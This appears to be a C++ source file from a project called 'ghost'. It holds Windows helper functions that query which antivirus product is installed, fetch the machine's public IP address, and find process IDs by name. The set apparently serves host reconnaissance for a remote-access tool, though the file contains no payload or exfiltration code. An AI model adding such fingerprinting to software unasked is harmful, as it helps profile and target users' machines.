/*
	@title
		ghost
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2018

	ghost is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	ghost is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include					<Windows.h>
#include					<wbemidl.h>
#include					<iostream>
#include					<conio.h>
#include					<comdef.h>
#include					<wininet.h>
#include					<TlHelp32.h>
#include					<string>
#include					"info.h"

#pragma comment				(lib, "wbemuuid.lib")

using namespace				std;
string						BstrToStdString(BSTR bstr, int cp = CP_UTF8);

/*
	http://www.rohitab.com/discuss/topic/42792-wmi-get-antivirus-name-c/?p=10106373
*/
string getAntivirus() {
	CoInitializeEx(0, 0);
	CoInitializeSecurity(0, -1, 0, 0, 0, 3, 0, 0, 0);
	IWbemLocator *locator = 0;
	CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void **)&locator);
	IWbemServices * services = 0;
	wchar_t *name = L"root\\SecurityCenter2";
	if (SUCCEEDED(locator->ConnectServer(name, 0, 0, 0, 0, 0, 0, &services))) {
		printf("Connected!\n");
		//Lets get system information
		CoSetProxyBlanket(services, 10, 0, 0, 3, 3, 0, 0);
		wchar_t *query = L"Select * From AntiVirusProduct";
		IEnumWbemClassObject *e = 0;
		if (SUCCEEDED(services->ExecQuery(L"WQL", query, WBEM_FLAG_FORWARD_ONLY, 0, &e))) {
			printf("Query executed successfuly!\n");
			IWbemClassObject *object = 0;
			ULONG u = 0;
			//lets enumerate all data from this table

			std::string antiVirus;

			while (e) {
				e->Next(WBEM_INFINITE, 1, &object, &u);
				if (!u) break;//no more data,end enumeration
				VARIANT cvtVersion;
				object->Get(L"displayName", 0, &cvtVersion, 0, 0);
				
				services->Release();
				locator->Release();
				CoUninitialize();
				_getch();

				return BstrToStdString(cvtVersion.bstrVal);
			}
		}
		else
			printf("Error executing query!\n");
	}
	else
		printf("Connection error!\n");
	
	services->Release();
	locator->Release();
	CoUninitialize();
	_getch();

	return string("No Antivirus Detected");
}

std::string& BstrToStdString(const BSTR bstr, std::string& dst, int cp = CP_UTF8)
{
	if (!bstr)
	{
		// define NULL functionality. I just clear the target.
		dst.clear();
		return dst;
	}

	// request content length in single-chars through a terminating
	//  nullchar in the BSTR. note: BSTR's support imbedded nullchars,
	//  so this will only convert through the first nullchar.
	int res = WideCharToMultiByte(cp, 0, bstr, -1, NULL, 0, NULL, NULL);
	if (res > 0)
	{
		dst.resize(res);
		WideCharToMultiByte(cp, 0, bstr, -1, &dst[0], res, NULL, NULL);
	}
	else
	{    // no content. clear target
		dst.clear();
	}
	return dst;
}

// conversion with temp.
std::string BstrToStdString(BSTR bstr, int cp)
{
	std::string str;
	BstrToStdString(bstr, str, cp);
	return str;
}

std::string real_ip() {

	HINTERNET net = InternetOpen("--",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET conn = InternetOpenUrl(net,
		"https://api.ipify.org/",
		NULL,
		0,
		INTERNET_FLAG_RELOAD,
		0);

	char buffer[4096];
	DWORD read;

	InternetReadFile(conn, buffer, sizeof(buffer) / sizeof(buffer[0]), &read);
	InternetCloseHandle(net);

	return std::string(buffer, read);
}

DWORD FindProcessId(const std::wstring & processName) {
	PROCESSENTRY32W processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32FirstW(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile)) {
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32NextW(processesSnapshot, &processInfo)) {
		if (!processName.compare(processInfo.szExeFile)) {
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}